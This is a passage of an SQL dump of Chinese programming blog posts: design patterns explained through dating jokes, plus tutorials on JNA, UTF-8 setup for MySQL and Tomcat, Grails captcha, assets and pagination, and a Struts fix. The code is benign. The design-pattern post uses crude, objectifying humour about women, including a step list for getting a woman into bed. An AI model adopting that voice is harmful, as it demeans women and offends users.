/>\r\n4、PROTOTYPE&mdash;跟MM用QQ聊天，一定要说些深情的话语了，我搜集了好多肉麻的情话，需要时只要copy出来放到QQ里面就行了，这就是我的情话prototype了。（100块钱一份，你要不要）&nbsp;<br />\r\n<strong>原始模型模式</strong>：通过给出一个原型对象来指明所要创建的对象的类型，然后用复制这个原型对象的方法创建出更多同类型的对象。原始模型模式允许动态的增加或减少产品类，产品类不需要非得有任何事先确定的等级结构，原始模型模式适用于任何的等级结构。缺点是每一个类都必须配备一个克隆方法。&nbsp;<br />\r\n5、SINGLETON&mdash;俺有6个漂亮的老婆，她们的老公都是我，我就是我们家里的老公Sigleton，她们只要说道&ldquo;老公&rdquo;，都是指的同一个人，那就是我(刚才做了个梦啦，哪有这么好的事)&nbsp;<br />\r\n<strong>单例模式</strong>：单例模式确保某一个类只有一个实例，而且自行实例化并向整个系统提供这个实例单例模式。单例模式只应在有真正的&ldquo;单一实例&rdquo;的需求时才可使用。&nbsp;<br />\r\n结构型模式&nbsp;<br />\r\n&nbsp; 6、ADAPTER&mdash;在朋友聚会上碰到了一个美女Sarah，从香港来的，可我不会说粤语，她不会说普通话，只好求助于我的朋友kent了，他作为我和Sarah之间的Adapter，让我和Sarah可以相互交谈了(也不知道他会不会耍我)&nbsp;<br />\r\n<strong>适配器（变压器）模式</strong>：把一个类的接口变换成客户端所期待的另一种接口，从而使原本因接口原因不匹配而无法一起工作的两个类能够一起工作。适配类可以根据参数返还一个合适的实例给客户端。&nbsp;<br />\r\n7、BRIDGE&mdash;早上碰到MM，要说早上好，晚上碰到MM，要说晚上好；碰到MM穿了件新衣服，要说你的衣服好漂亮哦，碰到MM新做的发型，要说你的头发好漂亮哦。不要问我&ldquo;早上碰到MM新做了个发型怎么说&rdquo;这种问题，自己用BRIDGE组合一下不就行了&nbsp;<br />\r\n<strong>桥梁模式</strong>：将抽象化与实现化脱耦，使得二者可以独立的变化，也就是说将他们之间的强关联变成弱关联，也就是指在一个软件系统的抽象化和实现化之间使用组合/聚合关系而不是继承关系，从而使两者可以独立的变化。&nbsp;<br />\r\n8、COMPOSITE&mdash;Mary今天过生日。&ldquo;我过生日，你要送我一件礼物。&rdquo;&ldquo;嗯，好吧，去商店，你自己挑。&rdquo;&ldquo;这件T恤挺漂亮，买，这条裙子好看，买，这个包也不错，买。&rdquo;&ldquo;喂，买了三件了呀，我只答应送一件礼物的哦。&rdquo;&ldquo;什么呀，T恤加裙子加包包，正好配成一套呀，小姐，麻烦你包起来。&rdquo;&ldquo;&hellip;&hellip;&rdquo;，MM都会用Composite模式了，你会了没有？&nbsp;<br />\r\n<strong>合成模式</strong>：合成模式将对象组织到树结构中，可以用来描述整体与部分的关系。合成模式就是一个处理对象的树结构的模式。合成模式把部分与整体的关系用树结构表示出来。合成模式使得客户端把一个个单独的成分对象和由他们复合而成的合成对象同等看待。&nbsp;<br />\r\n9、DECORATOR&mdash;Mary过完轮到Sarly过生日，还是不要叫她自己挑了，不然这个月伙食费肯定玩完，拿出我去年在华山顶上照的照片，在背面写上&ldquo;最好的的礼物，就是爱你的Fita&rdquo;，再到街上礼品店买了个像框（卖礼品的MM也很漂亮哦），再找隔壁搞美术设计的Mike设计了一个漂亮的盒子装起来&hellip;&hellip;，我们都是Decorator，最终都在修饰我这个人呀，怎么样，看懂了吗？&nbsp;<br />\r\n<strong>装饰模式</strong>：装饰模式以对客户端透明的方式扩展对象的功能，是继承关系的一个替代方案，提供比继承更多的灵活性。动态给一个对象增加功能，这些功能可以再动态的撤消。增加由一些基本功能的排列组合而产生的非常大量的功能。&nbsp;<br />\r\n10、FACADE&mdash;我有一个专业的Nikon相机，我就喜欢自己手动调光圈、快门，这样照出来的照片才专业，但MM可不懂这些，教了半天也不会。幸好相机有Facade设计模式，把相机调整到自动档，只要对准目标按快门就行了，一切由相机自动调整，这样MM也可以用这个相机给我拍张照片了。&nbsp;<br />\r\n<strong>门面模式</strong>：外部与一个子系统的通信必须通过一个统一的门面对象进行。门面模式提供一个高层次的接口，使得子系统更易于使用。每一个子系统只有一个门面类，而且此门面类只有一个实例，也就是说它是一个单例模式。但整个系统可以有多个门面类。&nbsp;<br />\r\n11、FLYWEIGHT&mdash;每天跟MM发短信，手指都累死了，最近买了个新手机，可以把一些常用的句子存在手机里，要用的时候，直接拿出来，在前面加上MM的名字就可以发送了，再不用一个字一个字敲了。共享的句子就是Flyweight，MM的名字就是提取出来的外部特征，根据上下文情况使用。&nbsp;<br />\r\n<strong>享元模式</strong>：FLYWEIGHT在拳击比赛中指最轻量级。享元模式以共享的方式高效的支持大量的细粒度对象。享元模式能做到共享的关键是区分内蕴状态和外蕴状态。内蕴状态存储在享元内部，不会随环境的改变而有所不同。外蕴状态是随环境的改变而改变的。外蕴状态不能影响内蕴状态，它们是相互独立的。将可以共享的状态和不可以共享的状态从常规类中区分开来，将不可以共享的状态从类里剔除出去。客户端不可以直接创建被共享的对象，而应当使用一个工厂对象负责创建被共享的对象。享元模式大幅度的降低内存中对象的数量。&nbsp;<br />\r\n12、PROXY&mdash;跟MM在网上聊天，一开头总是&ldquo;hi,你好&rdquo;,&ldquo;你从哪儿来呀？&rdquo;&ldquo;你多大了？&rdquo;&ldquo;身高多少呀？&rdquo;这些话，真烦人，写个程序做为我的Proxy吧，凡是接收到这些话都设置好了自动的回答，接收到其他的话时再通知我回答，怎么样，酷吧。&nbsp;<br />\r\n<strong>代理模式</strong>：代理模式给某一个对象提供一个代理对象，并由代理对象控制对源对象的引用。代理就是一个人或一个机构代表另一个人或者一个机构采取行动。某些情况下，客户不想或者不能够直接引用一个对象，代理对象可以在客户和目标对象直接起到中介的作用。客户端分辨不出代理主题对象与真实主题对象。代理模式可以并不知道真正的被代理对象，而仅仅持有一个被代理对象的接口，这时候代理对象不能够创建被代理对象，被代理对象必须有系统的其他角色代为创建并传入。&nbsp;<br />\r\n行为模式&nbsp;<br />\r\n13、CHAIN OF RESPONSIBLEITY&mdash;晚上去上英语课，为了好开溜坐到了最后一排，哇，前面坐了好几个漂亮的MM哎，找张纸条，写上&ldquo;Hi,可以做我的女朋友吗？如果不愿意请向前传&rdquo;，纸条就一个接一个的传上去了，糟糕，传到第一排的MM把纸条传给老师了，听说是个老处女呀，快跑!&nbsp;<br />\r\n<strong>责任链模式</strong>：在责任链模式中，很多对象由每一个对象对其下家的引用而接&nbsp;<br />\r\n起来形成一条链。请求在这个链上传递，直到链上的某一个对象决定处理此请求。客户并不知道链上的哪一个对象最终处理这个请求，系统可以在不影响客户端的情况下动态的重新组织链和分配责任。处理者有两个选择：承担责任或者把责任推给下家。一个请求可以最终不被任何接收端对象所接受。&nbsp;<br />\r\n14、COMMAND&mdash;俺有一个MM家里管得特别严，没法见面，只好借助于她弟弟在我们俩之间传送信息，她对我有什么指示，就写一张纸条让她弟弟带给我。这不，她弟弟又传送过来一个COMMAND，为了感谢他，我请他吃了碗杂酱面，哪知道他说：&ldquo;我同时给我姐姐三个男朋友送COMMAND，就数你最小气，才请我吃面。&rdquo;，:-(&nbsp;<br />\r\n<strong>命令模式</strong>：命令模式把一个请求或者操作封装到一个对象中。命令模式把发出命令的责任和执行命令的责任分割开，委派给不同的对象。命令模式允许请求的一方和发送的一方独立开来，使得请求的一方不必知道接收请求的一方的接口，更不必知道请求是怎么被接收，以及操作是否执行，何时被执行以及是怎么被执行的。系统支持命令的撤消。&nbsp;<br />\r\n15、INTERPRETER&mdash;俺有一个《泡MM真经》，上面有各种泡MM的攻略，比如说去吃西餐的步骤、去看电影的方法等等，跟MM约会时，只要做一个Interpreter，照着上面的脚本执行就可以了。&nbsp;<br />\r\n<strong>解释器模式</strong>：给定一个语言后，解释器模式可以定义出其文法的一种表示，并同时提供一个解释器。客户端可以使用这个解释器来解释这个语言中的句子。解释器模式将描述怎样在有了一个简单的文法后，使用模式设计解释这些语句。在解释器模式里面提到的语言是指任何解释器对象能够解释的任何组合。在解释器模式中需要定义一个代表文法的命令类的等级结构，也就是一系列的组合规则。每一个命令对象都有一个解释方法，代表对命令对象的解释。命令对象的等级结构中的对象的任何排列组合都是一个语言。&nbsp;<br />\r\n16、ITERATOR&mdash;我爱上了Mary，不顾一切的向她求婚。&nbsp;<br />\r\nMary：&ldquo;想要我跟你结婚，得答应我的条件&rdquo;&nbsp;<br />\r\n我：&ldquo;什么条件我都答应，你说吧&rdquo;&nbsp;<br />\r\n&nbsp; Mary：&ldquo;我看上了那个一克拉的钻石&rdquo;&nbsp;<br />\r\n我：&ldquo;我买，我买，还有吗？&rdquo;&nbsp;<br />\r\n&nbsp; Mary：&ldquo;我看上了湖边的那栋别墅&rdquo;&nbsp;<br />\r\n我：&ldquo;我买，我买，还有吗？&rdquo;&nbsp;<br />\r\n&nbsp; Mary：&ldquo;你的小弟弟必须要有50cm长&rdquo;&nbsp;<br />\r\n我脑袋嗡的一声，坐在椅子上，一咬牙：&ldquo;我剪，我剪，还有吗？&rdquo;&nbsp;<br />\r\n<strong>迭代子模式</strong>：迭代子模式可以顺序访问一个聚集中的元素而不必暴露聚集的内部表象。多个对象聚在一起形成的总体称之为聚集，聚集对象是能够包容一组对象的容器对象。迭代子模式将迭代逻辑封装到一个独立的子对象中，从而与聚集本身隔开。迭代子模式简化了聚集的界面。每一个聚集对象都可以有一个或一个以上的迭代子对象，每一个迭代子的迭代状态可以是彼此独立的。迭代算法可以独立于聚集角色变化。&nbsp;<br />\r\n17、MEDIATOR&mdash;四个MM打麻将，相互之间谁应该给谁多少钱算不清楚了，幸亏当时我在旁边，按照各自的筹码数算钱，赚了钱的从我这里拿，赔了钱的也付给我，一切就OK啦，俺得到了四个MM的电话。&nbsp;<br />\r\n<strong>调停者模式</strong>：调停者模式包装了一系列对象相互作用的方式，使得这些对象不必相互明显作用。从而使他们可以松散偶合。当某些对象之间的作用发生改变时，不会立即影响其他的一些对象之间的作用。保证这些作用可以彼此独立的变化。调停者模式将多对多的相互作用转化为一对多的相互作用。调停者模式将对象的行为和协作抽象化，把对象在小尺度的行为上与其他对象的相互作用分开处理。&nbsp;<br />\r\n18、MEMENTO&mdash;同时跟几个MM聊天时，一定要记清楚刚才跟MM说了些什么话，不然MM发现了会不高兴的哦，幸亏我有个备忘录，刚才与哪个MM说了什么话我都拷贝一份放到备忘录里面保存，这样可以随时察看以前的记录啦。&nbsp;<br />\r\n<strong>备忘录模式</strong>：备忘录对象是一个用来存储另外一个对象内部状态的快照的对象。备忘录模式的用意是在不破坏封装的条件下，将一个对象的状态捉住，并外部化，存储起来，从而可以在将来合适的时候把这个对象还原到存储起来的状态。&nbsp;<br />\r\n19、OBSERVER&mdash;想知道咱们公司最新MM情报吗？加入公司的MM情报邮件组就行了，tom负责搜集情报，他发现的新情报不用一个一个通知我们，直接发布给邮件组，我们作为订阅者（观察者）就可以及时收到情报啦&nbsp;<br />\r\n&nbsp;&nbsp;<strong>观察者模式</strong>：观察者模式定义了一种一队多的依赖关系，让多个观察者对象同时监听某一个主题对象。这个主题对象在状态上发生变化时，会通知所有观察者对象，使他们能够自动更新自己。&nbsp;<br />\r\n20、STATE&mdash;跟MM交往时，一定要注意她的状态哦，在不同的状态时她的行为会有不同，比如你约她今天晚上去看电影，对你没兴趣的MM就会说&ldquo;有事情啦&rdquo;，对你不讨厌但还没喜欢上的MM就会说&ldquo;好啊，不过可以带上我同事么？&rdquo;，已经喜欢上你的MM就会说&ldquo;几点钟？看完电影再去泡吧怎么样？&rdquo;，当然你看电影过程中表现良好的话，也可以把MM的状态从不讨厌不喜欢变成喜欢哦。&nbsp;<br />\r\n<strong>状态模式</strong>：状态模式允许一个对象在其内部状态改变的时候改变行为。这个对象看上去象是改变了它的类一样。状态模式把所研究的对象的行为包装在不同的状态对象里，每一个状态对象都属于一个抽象状态类的一个子类。状态模式的意图是让一个对象在其内部状态改变的时候，其行为也随之改变。状态模式需要对每一个系统可能取得的状态创立一个状态类的子类。当系统的状态变化时，系统便改变所选的子类。&nbsp;<br />\r\n21、STRATEGY&mdash;跟不同类型的MM约会，要用不同的策略，有的请电影比较好，有的则去吃小吃效果不错，有的去海边浪漫最合适，单目的都是为了得到MM的芳心，我的追MM锦囊中有好多Strategy哦。&nbsp;<br />\r\n<strong>策略模式</strong>：策略模式针对一组算法，将每一个算法封装到具有共同接口的独立的类中，从而使得它们可以相互替换。策略模式使得算法可以在不影响到客户端的情况下发生变化。策略模式把行为和环境分开。环境类负责维持和查询行为类，各种算法在具体的策略类中提供。由于算法和环境独立开来，算法的增减，修改都不会影响到环境和客户端。&nbsp;<br />\r\n22、TEMPLATE METHOD&mdash;&mdash;看过《如何说服女生上床》这部经典文章吗？女生从认识到上床的不变的步骤分为巧遇、打破僵局、展开追求、接吻、前戏、动手、爱抚、进去八大步骤(Template method)，但每个步骤针对不同的情况，都有不一样的做法，这就要看你随机应变啦(具体实现)；&nbsp;<br />\r\n<strong>模板方法模式</strong>：模板方法模式准备一个抽象类，将部分逻辑以具体方法以及具体构造子的形式实现，然后声明一些抽象方法来迫使子类实现剩余的逻辑。不同的子类可以以不同的方式实现这些抽象方法，从而对剩余的逻辑有不同的实现。先制定一个顶级逻辑框架，而将逻辑的细节留给具体的子类去实现。&nbsp;<br />\r\n&nbsp; 23、VISITOR&mdash;情人节到了，要给每个MM送一束鲜花和一张卡片，可是每个MM送的花都要针对她个人的特点，每张卡片也要根据个人的特点来挑，我一个人哪搞得清楚，还是找花店老板和礼品店老板做一下Visitor，让花店老板根据MM的特点选一束花，让礼品店老板也根据每个人特点选一张卡，这样就轻松多了；&nbsp;<br />\r\n<strong>访问者模式</strong>：访问者模式的目的是封装一些施加于某种数据结构元素之上的操作。一旦这些操作需要修改的话，接受这个操作的数据结构可以保持不变。访问者模式适用于数据结构相对未定的系统，它把数据结构和作用于结构上的操作之间的耦合解脱开，使得操作集合可以相对自由的演化。访问者模式使得增加新的操作变的很容易，就是增加一个新的访问者类。访问者模式将有关的行为集中到一个访问者对象中，而不是分散到一个个的节点类中。当使用访问者模式时，要将尽可能多的对象浏览逻辑放在访问者类中，而不是放到它的子类中。访问者模式可以跨过几个类的等级结构访问属于不同的等级结构的成员类。</p>\r\n','20150419150443',0,33,0,1),(20,'<p>1、jna是什么</p>\r\n\r\n<p>jna是java native access的简称，用他可以调用C、C++代码，特别是windows中强大的库文件（dll，在linux下是so文件），这样java就可以操控底层的一些东西，比如调用加密机、智能卡之类的</p>\r\n\r\n<p>2、jna下载</p>\r\n\r\n<p>在maven下直接找jna就有，对应的jar包是jna-3.3.0.jar</p>\r\n\r\n<p>3、调用msvcrt.dll(这是windows自带动态链接库&nbsp;)，不用找，他在system32下</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package com.jnastudy.test;\r\n\r\nimport com.sun.jna.Library;\r\nimport com.sun.jna.Native;\r\nimport com.sun.jna.Platform;\r\nimport com.sun.jna.platform.win32.Kernel32;\r\nimport com.sun.jna.platform.win32.User32;\r\n\r\npublic class JNATest {\r\n	//编写一个接口，必须继承Library，他要在加载库文件时用\r\n	public interface CLibrary extends Library {\r\n		//加载库文件，Platform.isWindows()可以判断系统类型\r\n		CLibrary INSTANCE = (CLibrary) Native.loadLibrary(\r\n				(Platform.isWindows() ? \"msvcrt\" : \"c\"), CLibrary.class);\r\n		//定义方法，与c语言标准的一致\r\n		void printf(String format, Object... args);\r\n	}\r\n	public static void main(String[] args) {\r\n		//调用\r\n		CLibrary.INSTANCE.printf(\"%d----%f--\",5,5.2f);\r\n		\r\n		final User32 user32 = User32.INSTANCE;\r\n		System.out.println(user32);\r\n		final Kernel32 kernel32 = Kernel32.INSTANCE;\r\n		System.out.println(kernel32.toString());\r\n	}\r\n}\r\n</code></pre>\r\n\r\n<p><br />\r\n&nbsp;</p>\r\n','20150419172021',0,32,0,2),(21,'<p>1、代码编码全部用UTF8，特别是配置用的属性文件</p>\r\n\r\n<p>2、JSP页面编码</p>\r\n\r\n<p>3、request请求编码</p>\r\n\r\n<p>4、数据库jdbc连接编码jdbc:mysql://127.0.0.1:3306/nts?useUnicode=true&amp;characterEncoding=utf8</p>\r\n\r\n<p>5、数据库编码</p>\r\n\r\n<p>&nbsp; &nbsp; 查看编码：</p>\r\n\r\n<p>show variables like &#39;character\\_set\\_%&#39;;</p>\r\n\r\n<p>创建数据库指定编码：</p>\r\n\r\n<p>create database mydb character set utf-8;#直接指定其编码</p>\r\n\r\n<p>修改数据库编码：</p>\r\n\r\n<p>set character_set_client=utf8;</p>\r\n\r\n<p>set character_set_connection=utf8;</p>\r\n\r\n<p>set character_set_database=utf8;</p>\r\n\r\n<p>set character_set_results=utf8;</p>\r\n\r\n<p>set character_set_server=utf8;</p>\r\n\r\n<p>alter database mydb character set utf-8;</p>\r\n\r\n<p>set names utf8</p>\r\n\r\n<p>修改my.cnf文件</p>\r\n\r\n<p>在[client]下增加default-character-set=utf8</p>\r\n\r\n<p>在[mysqld]下增加default-character-set=utf8</p>\r\n\r\n<p>同时加上init_connect=&#39;SET NAMES utf8&#39; (设定连接mysql数据库时使用utf8编码，以让mysql数据库为utf8运行)</p>\r\n\r\n<p>修改tomcat编码，打开server.xml</p>\r\n\r\n<p>&nbsp;&lt;Connector port=&quot;80&quot; protocol=&quot;HTTP/1.1&quot;</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;connectionTimeout=&quot;20000&quot;</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;redirectPort=&quot;8443&quot; &nbsp;URIEncoding=&quot;UTF-8&quot;/&gt;</p>\r\n\r\n<p>系统编码：</p>\r\n\r\n<p>乱码文件名恢复</p>\r\n\r\n<p>convmv -f gbk -t utf8 &nbsp;*。*（--notest）</p>\r\n','20150419210403',0,29,0,2),(22,'<p>1、安装</p>\r\n\r\n<p>Grails命令代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-ini\">grails install-plugin jcaptcha  </code></pre>\r\n\r\n<p>&nbsp;2、现在Config.groovy文件中定义验证码图片样式</p>\r\n\r\n<p>Config文件结构：</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">log4j {  \r\n\r\n    /* log4j config */  \r\n\r\n}  \r\n\r\n  \r\n\r\njcaptchas {  \r\n\r\n //captcha1 图片的id  \r\n\r\n captcha1 = …   \r\n\r\n captcha2 = …   \r\n\r\n}  \r\n\r\n 一个Example：\r\n\r\nJava代码  \r\n\r\njcaptchas {  \r\n\r\n    Random random = new Random(new Date().getTime());  \r\n\r\n    imageCaptcha = new GenericManageableCaptchaService(  \r\n\r\n            new GenericCaptchaEngine(  \r\n\r\n                    new GimpyFactory(  \r\n\r\n                            //随机字符范围  \r\n\r\n                            new RandomWordGenerator(  \r\n\r\n                                    \"加减乘除abcdefghjklmnopqOPQARSTS\"  \r\n\r\n                            ),  \r\n\r\n                            new ComposedWordToImage(  \r\n\r\n                                    //字体  \r\n\r\n                                    new RandomFontGenerator(  \r\n\r\n                                            20, // min font size  \r\n\r\n                                            30, // max font size  \r\n\r\n                                            [new Font(\"宋体\", 0, 10)] as Font[]  \r\n\r\n                                    ),  \r\n\r\n                                    //图片背景  \r\n\r\n                                    new GradientBackgroundGenerator(  \r\n\r\n                                            200, // width  \r\n\r\n                                            100, // height  \r\n\r\n                                            new SingleColorGenerator(new Color(random.nextInt(255), random.nextInt(255), random.nextInt(255))),  \r\n\r\n                                            new SingleColorGenerator(new Color(random.nextInt(255), random.nextInt(255), random.nextInt(255)))  \r\n\r\n                                    ),  \r\n\r\n                                    //字符颜色个数限制  \r\n\r\n                                    new NonLinearTextPaster(  \r\n\r\n                                            1, // minimal length of text  \r\n\r\n                                            4, // maximal length of text  \r\n\r\n                                            new Color(random.nextInt(255), random.nextInt(255), random.nextInt(255))  \r\n\r\n                                    )  \r\n\r\n                            )  \r\n\r\n                    )  \r\n\r\n            ),  \r\n\r\n            180, // minGuarantedStorageDelayInSeconds  \r\n\r\n            180000 // maxCaptchaStoreSize  \r\n\r\n    )  \r\n\r\n}  </code></pre>\r\n\r\n<p>&nbsp;3、标签引用：</p>\r\n\r\n<p>Html代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-html\">&lt;%@ page contentType=\"text/html;charset=UTF-8\" %&gt;  \r\n\r\n&lt;html&gt;  \r\n\r\n&lt;head&gt;&lt;title&gt;Simple GSP page&lt;/title&gt;&lt;/head&gt;  \r\n\r\n  \r\n\r\n&lt;body&gt;  \r\n\r\n&lt;g:form controller=\"validate\" action=\"valid\"&gt;  \r\n\r\n    &lt;!--name与config.groovy中定义的一致 --&gt;  \r\n\r\n    &lt;jcaptcha:jpeg name=\"imageCaptcha\"/&gt;  \r\n\r\n    &lt;label&gt;  \r\n\r\n        &lt;input type=\"text\" name=\"code\" value=\"\"/&gt;  \r\n\r\n    &lt;/label&gt;  \r\n\r\n    &lt;input type=\"submit\" value=\"提交\"/&gt;  \r\n\r\n&lt;/g:form&gt;  \r\n\r\n&lt;/body&gt;  \r\n\r\n&lt;/html&gt;  </code></pre>\r\n\r\n<p>&nbsp;4、验证输入是否正确：</p>\r\n\r\n<p>在Controller中定义</p>\r\n\r\n<p>Java代码&nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package demo  \r\n\r\n  \r\n\r\nclass ValidateController {  \r\n\r\n  \r\n\r\n    //这个是注入的  \r\n\r\n    def jcaptchaService;  \r\n\r\n  \r\n\r\n    def index = {  \r\n\r\n        redirect(action: \"valid\")  \r\n\r\n    }  \r\n\r\n  \r\n\r\n    def valid = {  \r\n\r\n        println params  \r\n\r\n        println session.id  \r\n\r\n        if (params.size() == 2) {  \r\n\r\n            return render(view: \'code\');  \r\n\r\n        }  \r\n\r\n        /* \r\n\r\n        这里的try catch 是为了防止重复提交，重复提交会报错误 \r\n\r\n         */  \r\n\r\n        try {  \r\n\r\n            /* \r\n\r\n            三个参数：name(标签中的name),session.id这个是固定的,用户输入的内容 \r\n\r\n             */  \r\n\r\n            if (!jcaptchaService.validateResponse(\"imageCaptcha\", session.id, params.code)) {  \r\n\r\n                flash.message = \"错误\"  \r\n\r\n            } else {  \r\n\r\n                flash.message = \"正确\"  \r\n\r\n            }  \r\n\r\n        } catch (Exception e) {  \r\n\r\n            log.error(e.message);  \r\n\r\n            flash.message = \"拒绝重复提交\"  \r\n\r\n        }  \r\n\r\n        return render(view: \"message\");  \r\n\r\n    }  \r\n\r\n}  \r\n\r\n </code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150419211553',0,30,0,2),(23,'<p>assets插件是为了取代resources插件的，主要管理静态资源，比如css,js,image等；assets默认会创建images、javascripts、stylesheets三个文件夹，如果在页面中取资源可以用标签&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-html\">&lt;asset:stylesheet charset=\"UTF-8\" href=\"lib/bootstrap-validator/css/bootstrapValidator.min.css\"/&gt;\r\n    &lt;asset:javascript src=\"lib/bootstrap-validator/js/bootstrapValidator.min.js\"/&gt;\r\n    &lt;asset:javascript src=\"coderstar/front/login.js\"/&gt;</code></pre>\r\n\r\n<p>注意不要使用index文件夹，因为他模式的action名字就叫index</p>\r\n\r\n<pre>\r\n但是对于一些js库里在js文件里包含其他的js文件的可能会出错，比如ckeditor可以这样解决\r\n</pre>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">&lt;script type=\"text/javascript\"&gt;\r\n    var  CKEDITOR_BASEPATH = \"/assets/lib/ckeditor/\";\r\n&lt;/script&gt;</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150419213444',0,25,0,2),(24,'<p>删除asm-*.jar,cglib-*.jar;添加asm-all-4.1.jar，cglib-nodep-2.2.2.jar；</p>\r\n','20150419213727',0,19,0,2),(25,'<p>将&lt;constant&nbsp;name=&quot;struts.objectFactory&quot;&nbsp;value=&quot;spring&quot;/&gt;改成<br />\r\n&lt;constant&nbsp;name=&quot;struts.objectFactory&quot;&nbsp;value=&quot;org.apache.struts2.spring.StrutsSpringObjectFactory&quot;&nbsp;/&gt;就可以了！</p>\r\n','20150420082250',0,22,0,2),(26,'<p>将&lt;constant&nbsp;name=&quot;struts.objectFactory&quot;&nbsp;value=&quot;spring&quot;/&gt;改成<br />\r\n&lt;constant&nbsp;name=&quot;struts.objectFactory&quot;&nbsp;value=&quot;org.apache.struts2.spring.StrutsSpringObjectFactory&quot;&nbsp;/&gt;就可以了！</p>\r\n','20150420082313',0,23,0,2),(27,'<pre>\r\n接口的最主要的作用是达到统一访问，就是在创建对象的时候用接口创建，【接口名】 【对象名】=new 【实现接口的类】，这样你像用哪个类的对象就可以new哪个对象了，不需要改原来的代码，就和你的USB接口一样，插什么读什么，就是这个原理。就像你问的，都有个method1的方法，如果我用接口，我上面就可以one.method1();是吧？那样我new a（）；就是用a的方法，new b（）就是用b的方法\r\n这样不方便吗？\r\n这个就叫统一访问，因为你实现这个接口的类的方法名相同，但是实现内容不同\r\n我用接口来定义对象不就可以做到统一访问了吗？接口主要针对多个类实现它来说的，要是只有一个类当然可以不用接口了.你这样想，我做一个USB接口，有个read（）抽象方法，然后mp3类实现，U盘类实现，移动硬盘类实现，这样我用的时候用USB a=new 【类名】；这样a.read();要是我类名里写U盘，就读U盘，写mp3就读mp3,而这个名字可以从属性文件里读，你写哪个就用哪个了，呵呵。</pre>\r\n','20150420082402',0,4,0,2),(28,'<pre>\r\n所有新语言出现时都会有相同的优点。\r\n\r\n语言精练（其实就是功能不足）\r\n开发较快（原因同上，你的选择较少）\r\n\r\n    原因是新语言总是针对某一方进行专门的优化，进行此一方面的开发时会有优势。不过其他方面就会较弱。\r\n\r\n    此后有两种变化，一个是专门化，例如fortran那样，成为一个方面专用的。\r\n    另一种就是通用化，完善各个方面。等到慢慢完善以后，并提供了广泛的功能，就都差不多了。java其实就是这样，初期也是为了web专用，后来慢慢开始 j2se j2ee j2me发展开来。</pre>\r\n','20150420083019',0,35,1,1),(29,'<pre>\r\ngsp里面 有这么一个标签 &lt;g:paginate total=&quot;${functionInstanceTotal}&quot; /&gt;\r\n\r\ncontroller里面代码示例：\r\n\r\n </pre>\r\n\r\n<pre>\r\n<code class=\"language-java\">  def list(Integer max) {\r\n		int pageSize = 10\r\n        params.max = Math.min(max ?: 10, 100)\r\n		if(!params.offset){\r\n			params.offset = 0\r\n		}\r\n		//查询已经启用的车型\r\n		def mId = Model.createCriteria().list(){\r\n			eq(\"isDisabled\", 0)\r\n		}.id\r\n		def lis = Car.createCriteria().list(max:pageSize,offset: params.offset, sort:\"createTime\", order:\'desc\'){\r\n			\r\n			eq(\"isDeleted\",0)\r\n		}\r\n        [carInstanceList: lis, carInstanceTotal: lis.totalCount]\r\n    }</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150420083111',0,34,0,1),(30,'<p>懂得</p>\r\n','20150421141632',0,33,1,5),(31,'<p><strong>Grails的优势</strong></p>\r\n\r\n<p>DRY（Don&#39;t Repeat Yourself，不要重复自己），约定优于配置（Convention over Configuration）</p>\r\n\r\n<p>DRY和约定优先于配置的思想，是由Rails兴起并迅速被广泛接收和欣赏的Web框架新思路。Grails作为JEE世界的Rails，把这些最前沿的设计理念带入已显得陈旧的JEE社区，拥有鲜明突出的特点，以及由此带来的优秀的开发效率。</p>\r\n\r\n<p>DRY 的思想是避免重复的信息。Grails中的DRY主要提现在URL映射定义上（URLMappings.groovy）。在 URLMappings.groovy中定义了应用的各个URL以后，通过使用Grails预定义的动态Controller方法和GSP标签，开发者就 不必再把程序URL硬编码在各处。比如使用GSP标签，&nbsp;和，只需要提供Controller，Action和可选的参数，就能产生所需的URL。具体的用法可以查阅Grails文档&nbsp;。</p>\r\n\r\n<p>在约定优于配置方面，Grails和Rails非常相似。所谓约定优于配置，就是按照框架约定的方式来组织资源，就可以免去任何额外的配置。比如 Grails的自定义标签，存放在应用目录下的<code>grails-app/taglib</code>路径下，并以<code>XXXTagLib.groovy</code>的方式命名，就能无需任 何配置就可以在GSP里使用这些标签库了。另外还有Service类，Job类，包括整个Grails应用的目录结构，都是约定由于配置原则的体现。在这 些方面JEE开发者一定会为摆脱各种繁琐的配置感到异常兴奋，并且实实在在的节约很多开发时间。</p>\r\n\r\n<p><strong>JVM</strong></p>\r\n\r\n<p>通过运行在JVM之上，Grails拥有一个经过多年开发，已经非常成熟，业界标准级别的运行环境。JVM的稳定性和最新版本的性能都已经相当成熟。相比 最直接的比较对象Rails，Grails在运行环境性能上的优势是比较明显的。另外，已有的Java可重用组件基本都可以直接使用于Grails，无疑 也是Grails的一个明显优势。</p>\r\n\r\n<p><strong>Groovy语言</strong></p>\r\n\r\n<p>Grails和Groovy语言的关系是密不可分的。对于Groovy来说，Grails是其最大的杀手级应用。而对Grails来说，Groovy是其能够实现灵活多变的快速开发，区别于其他运行于JVM之上的Web框架的核心技术。</p>\r\n\r\n<p>Groovy的动态特性是其最大亮点，在这方面几乎不输于Ruby等其他热门的动态语言。meta-programming，closure等等热门的动 态语言特性在Groovy中都有很好的实现。而且，Groovy程序能够编译为JVM字节码的.class文件，直接运行在JVM上，Groovy程序的 性能能够得到一定的帮助。Groovy能够和Java混合编写，混合编译，使得Java程序员能不用浪费自己在Java语言上的大量投入，更轻松快捷地进 入Groovy的世界。使用Groovy编程，相比使用Java来说快速轻松得多，对为数众多的Java程序员颇有吸引力。</p>\r\n\r\n<p><strong>插件系统</strong></p>\r\n\r\n<p>Grails的插件系统也是其亮点之一。首先，和Rails，Django等Web框架类似，基于微内核的思想，插件（可重用模块）是框架的一等公民。 